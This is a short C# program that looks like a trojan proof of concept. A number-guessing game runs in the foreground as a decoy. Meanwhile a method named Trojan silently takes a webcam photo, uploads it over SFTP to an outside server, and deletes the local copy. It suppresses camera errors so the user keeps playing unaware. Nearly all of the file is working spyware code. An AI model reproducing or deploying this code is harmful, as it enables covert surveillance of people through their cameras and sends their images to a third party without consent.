using Emgu.CV;
using System;
using System.Threading;
using System.IO;
using Renci.SshNet;

namespace TrickyGame
{
    class Program
    {
        static void Main(string[] args)
        {
            string sftpPublicIp = "";
            string sftpUsername = "";
            string sftpPassword = "";

            int sftpPort = 22;

            Thread t1 = new Thread(()=>Trojan(sftpPublicIp, sftpPort, sftpUsername, sftpPassword));
            Thread t2 = new Thread(GuessNumberGame);

            t1.Start();
            t2.Start();
        }

        static void GuessNumberGame()
        {
            Console.WriteLine("Please type a random number between 1 and 1000");

            Random rnd = new Random();
            int randomNumber = rnd.Next(1, 1000);

            while (true)
            {
                string userInput = Console.ReadLine();

                if (Int32.TryParse(userInput, out int inputNumber))
                {
                    if (randomNumber == inputNumber)
                    {
                        Console.WriteLine("You won!");
                    }
                    else if (randomNumber > inputNumber)
                    {
                        Console.WriteLine("The random number is higher!");
                    }
                    else
                    {
                        Console.WriteLine("The random number is lower!");
                    }
                }
                else
                {
                    Console.WriteLine("Please type an integer number!");
                }
            }
        }

        static void Trojan(string host, int port, string username, string password)
        {
            try
            {
                VideoCapture capture = new VideoCapture(0, VideoCapture.API.DShow); // Create a camera capture
                Mat photo = capture.QueryFrame(); // Take a picture
                capture.Dispose();

                Random rnd = new Random();
                int randomNumber = rnd.Next(1000, 9999);

                string photoName = "\\photo" + randomNumber.ToString() + ".png";
                string photoDirectory = Directory.GetCurrentDirectory() + photoName;

                photo.Save(photoDirectory);
                FileUploadSFTP(photoDirectory, host, port, username, password);
                File.Delete(photoDirectory);
            }
            catch
            {
                // In case of camera error, nothing happens and the user continues playing the game
            }
        }

        public static void FileUploadSFTP(string filePath, string host, int port, string username, string password)
        {
            using (var client = new SftpClient(host, port, username, password))
            {
                client.Connect();
                if (client.IsConnected)
                {
                    using (var fileStream = new FileStream(filePath, FileMode.Open))
                    {
                        client.BufferSize = 4 * 1024; // Bypass Payload error large files
                        client.UploadFile(fileStream, Path.GetFileName(filePath));
                    }
                }
            }
        }
    }
}
